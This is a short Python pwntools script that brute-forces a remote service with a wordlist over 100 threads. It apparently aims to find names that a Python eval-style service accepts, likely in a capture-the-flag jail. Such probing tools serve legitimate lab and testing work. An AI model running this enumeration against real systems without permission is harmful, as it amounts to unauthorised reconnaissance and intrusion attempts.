#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "" #[Target ip]
target_port = 8080  #[Port] 
wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" #[Wordlist]
stop_flag = threading.Event()
num_threads = 100


def brute_force_input(words):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for word in words:
        if stop_flag.is_set():
            r.close()
            return
        if word == "shell":
            continue
        r.sendline(word.encode())
        output = r.recvline()
        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
                stop_flag.set()
                print(f"[+] Input found: {word}")
                print(f"[+] Output recieved: {output}")
                r.close()
                return
    r.close()
    return


def main():
    words = [line.strip() for line in open(wordlist, "r").readlines()]
    words_length = len(words)
    step = (words_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, words_length)
        if start < words_length:
            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
